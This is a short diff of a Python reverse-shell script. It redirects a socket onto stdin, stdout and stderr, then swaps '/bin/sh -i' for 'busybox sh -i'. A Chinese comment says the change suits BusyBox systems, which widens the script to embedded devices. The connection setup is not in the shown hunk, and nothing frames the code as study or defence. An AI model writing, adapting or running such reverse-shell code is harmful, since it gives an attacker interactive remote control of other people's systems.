@@ -12,7 +12,8 @@ def main():
     os.dup2(s.fileno(), 0)  # stdin
     os.dup2(s.fileno(), 1)  # stdout
     os.dup2(s.fileno(), 2)  # stderr
-    subprocess.call(["/bin/sh", "-i"])
+    # subprocess.call(["/bin/sh", "-i"])
+    subprocess.call(["busybox", "sh", "-i"])  # 使用busybox的sh，适用于BusyBox环境
 
 if __name__ == "__main__":
     main()
